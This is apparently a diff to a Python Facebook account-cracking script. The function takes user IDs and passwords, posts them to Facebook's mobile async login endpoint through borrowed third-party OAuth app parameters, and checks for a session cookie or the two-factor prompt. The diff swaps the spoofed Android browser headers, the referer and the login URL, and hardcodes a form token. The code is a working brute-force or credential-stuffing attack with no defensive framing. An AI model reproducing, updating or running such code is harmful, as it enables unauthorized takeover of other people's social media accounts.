@@ -1882,27 +1882,25 @@ def p(uid,pwx,tl):
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
+            'dpr': '2.75',
             'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=531310443646320&kid_directed_site=0&app_id=531310443646320&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D531310443646320%26redirect_uri%3Dhttps%253A%252F%252Ffederatedid-na1.services.adobe.com%252Ffederated%252FfromOIDC%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%26scope%3Demail%2Bpublic_profile%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1ebf45f3-ba40-4074-ac42-2ca0e8a52a67%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ffederatedid-na1.services.adobe.com%2Ffederated%2FfromOIDC%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="122.0.6261.112", "Not(A:Brand";v="24.0.0.0", "Google Chrome";v="122.0.6261.112"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1677117279315605&kid_directed_site=0&app_id=1677117279315605&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1677117279315605%26state%3D4cf403426f2dbc860cb545a912cefcf1%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Faccount%252Fthirdback%253Ft%253D2%26scope%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D88c883c2-9abb-4b87-b338-fcf09a089a5f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ailabtools.com%2Faccount%2Fthirdback%3Ft%3D2%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4cf403426f2dbc860cb545a912cefcf1%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23128PC33I"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-            'viewport-width': '1366',
+            'user-agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .19; WOW64)QQ1B)Applewebkit/537.36 (KHTML, like Gecko) Chrome/126.0.4042.92 Safari/537.36 Vivaldi/6.0.2979.18',
+            'viewport-width': '393',
             'x-asbd-id': '129477',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream'}
+            'x-fb-lsd': 'AVqKWXNp6Cg'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?api_key=531310443646320&auth_token=b8e3c549123592c35a5abcf94018abcb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D531310443646320%26redirect_uri%3Dhttps%253A%252F%252Ffederatedid-na1.services.adobe.com%252Ffederated%252FfromOIDC%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%26scope%3Demail%2Bpublic_profile%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1ebf45f3-ba40-4074-ac42-2ca0e8a52a67%26tp%3Dunspecified&refsrc=deprecated&app_id=531310443646320&cancel=https%3A%2F%2Ffederatedid-na1.services.adobe.com%2Ffederated%2FfromOIDC%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAYrrF_CKVfDuzpZthbP3NDHslWyCHBXiy3EhGfLPlp7vTIklgZJ-ani285stO9DonjH9GI1egpT-%23_%3D_&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/?api_key=1677117279315605&auth_token=4e33838221e0ca47c75cd528908d28a0&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1677117279315605%26state%3D8ff1c52b7dde7e6f906b97b9870d0569%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Faccount%252Fthirdback%253Ft%253D2%26scope%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2f909041-1f66-4369-b5a2-733062905a98%26tp%3Dunspecified%26cbt%3D1710419839596&refsrc=deprecated&app_id=1677117279315605&cancel=https%3A%2F%2Fwww.ailabtools.com%2Faccount%2Fthirdback%3Ft%3D2%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8ff1c52b7dde7e6f906b97b9870d0569%23_%3D_&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
